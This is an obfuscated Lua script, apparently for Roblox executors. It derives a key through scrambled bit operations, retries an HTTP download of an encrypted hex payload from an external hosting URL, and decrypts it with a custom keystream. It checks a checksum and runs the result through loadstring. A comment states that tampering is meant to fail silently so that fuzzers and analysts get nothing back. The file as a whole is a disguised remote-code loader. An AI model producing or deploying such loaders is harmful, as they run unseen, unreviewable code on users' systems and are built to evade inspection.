local fjc0dw=bit32 or bit
local e5d18,mlao,udjzoi,x5d3
if fjc0dw then e5d18,mlao,udjzoi,x5d3=fjc0dw.bxor,fjc0dw.lshift,fjc0dw.rshift,fjc0dw.band
else
local function vvwqvv(hbgo) return hbgo%4294967296 end
e5d18=function(hbgo,ukmkxr) local ojupsq,z5h=0,1 for ord=1,32 do local df3chp,judk=hbgo%2,ukmkxr%2 if df3chp~=judk then ojupsq=ojupsq+z5h end hbgo=(hbgo-df3chp)/2 ukmkxr=(ukmkxr-judk)/2 z5h=z5h*2 end return ojupsq end
mlao=function(hbgo,ukmkxr) return vvwqvv(hbgo*2^ukmkxr) end
udjzoi=function(hbgo,ukmkxr) return math.floor(vvwqvv(hbgo)/2^ukmkxr) end
x5d3=function(hbgo,ukmkxr) local ojupsq,z5h=0,1 for ord=1,32 do local df3chp,judk=hbgo%2,ukmkxr%2 if df3chp==1 and judk==1 then ojupsq=ojupsq+z5h end hbgo=(hbgo-df3chp)/2 ukmkxr=(ukmkxr-judk)/2 z5h=z5h*2 end return ojupsq end
end
local function qcs9b(hbgo) if hbgo==0 then hbgo=2654435769 end hbgo=e5d18(hbgo,mlao(hbgo,13)) hbgo=e5d18(hbgo,udjzoi(hbgo,17)) hbgo=e5d18(hbgo,mlao(hbgo,5)) return hbgo end
local vqdcs="ad6088f6".."da3bd230".."5dbadf".."32e611cf".."5d"
local i8y9=tonumber(vqdcs:sub(1,8),16)
local xp6=tonumber(vqdcs:sub(9,16),16)
if i8y9==0 then i8y9=2654435769 end
if xp6==0 then xp6=2242054355 end
local ja65d=668265261
i8y9=e5d18(i8y9,vqdcs:byte(13))
i8y9=(i8y9+xp6)%4294967296
xp6=e5d18(xp6,i8y9)
i8y9,xp6=xp6,i8y9
i8y9=qcs9b(i8y9)
xp6=qcs9b(xp6)
i8y9=(mlao(i8y9,21)+udjzoi(i8y9,11))%4294967296
ja65d=(ja65d*3+(748015373+694487247))%4294967296
i8y9=(i8y9+3148284247)%4294967296
xp6=e5d18(xp6,(353616924+2794667323))
i8y9=qcs9b(i8y9)
xp6=qcs9b(xp6)
i8y9,xp6=xp6,i8y9
i8y9=(i8y9+(813367980+696117202))%4294967296
xp6=e5d18(xp6,1509485182)
ja65d=(ja65d*3+2476783071)%4294967296
i8y9=(mlao(i8y9,9)+udjzoi(i8y9,23))%4294967296
i8y9,xp6=xp6,i8y9
i8y9=(i8y9+(287633444+198098289))%4294967296
i8y9=(i8y9+2832137777)%4294967296
i8y9=(i8y9*64083)%4294967296
ja65d=(ja65d*3+3201414636)%4294967296
i8y9=(i8y9+(121335955+30274048))%4294967296
xp6=e5d18(xp6,(134761834+16848169))
i8y9=qcs9b(i8y9)
xp6=qcs9b(xp6)
i8y9,xp6=xp6,i8y9
i8y9=qcs9b(i8y9)
xp6=qcs9b(xp6)
i8y9=e5d18(i8y9,vqdcs:byte(4))
i8y9=(i8y9+(3113255926+923533131))%4294967296
xp6=e5d18(xp6,4036789057)
local v5r9ub=string.format("%08x",i8y9)..string.format("%08x",xp6)
local hmp65="https://lua-script-hosting-api.vercel.app/api/load/".."d37b4".."9750733".."6d396".."85ac".."005c".."352c49".."c9acfb6".."c59".."42a".."fb2ceb7".."d5cdd".."a8c9cabe"
hmp65=hmp65.."?n=".."f33be".."0f2d0c".."5b79f8".."f2f845d".."b35".."f2e8".."a7f16c14".."7b3".."b753e".."5".."&p="..v5r9ub
local d9nxdv
for ord=1,3 do
local esc1,pc51=pcall(function() return game:HttpGet(hmp65) end)
if esc1 and type(pc51)=="string" and #pc51>=2 then d9nxdv=pc51 break end
if ord<3 then local nqbx5d=(task and task.wait) or wait if nqbx5d then pcall(nqbx5d,1) end end
end
if not d9nxdv then return end
local qu22th=i8y9
local fml2w=xp6
if qu22th==0 then qu22th=2654435769 end
if fml2w==0 then fml2w=2242054355 end
local tv0,lnpwr={},{}
for czdk in d9nxdv:gmatch("%x%x") do
qu22th=qcs9b(qu22th)
fml2w=(fml2w+2654435769)%4294967296
local wz2vi=x5d3(e5d18(qu22th,udjzoi(fml2w,11)),255)
tv0[#tv0+1]=string.char(e5d18(tonumber(czdk,16),wz2vi))
if #tv0>=4096 then lnpwr[#lnpwr+1]=table.concat(tv0) tv0={} end
end
if #lnpwr==0 and #tv0==0 then return end
if #tv0>0 then lnpwr[#lnpwr+1]=table.concat(tv0) end
local fjf=table.concat(lnpwr)
-- Integrity gate: the payload ends with "--I:<8hex>", a checksum over
-- everything before it. A wrong key (binary garbage), a truncated
-- capture, or an edited payload all fail here SILENTLY: no error, no
-- output, nothing for a fuzzer to iterate against.
local dc9u=fjf:match("%-%-I:(%x%x%x%x%x%x%x%x)%s*$")
if not dc9u then return end
fjf=fjf:gsub("%-%-I:%x%x%x%x%x%x%x%x%s*$","")
local u1k=5381
for ord=1,#fjf do u1k=(u1k*33+fjf:byte(ord))%4294967296 end
if u1k%268435456~=tonumber(dc9u,16) then return end
local qbj3=loadstring(fjf)
if qbj3 then return qbj3() end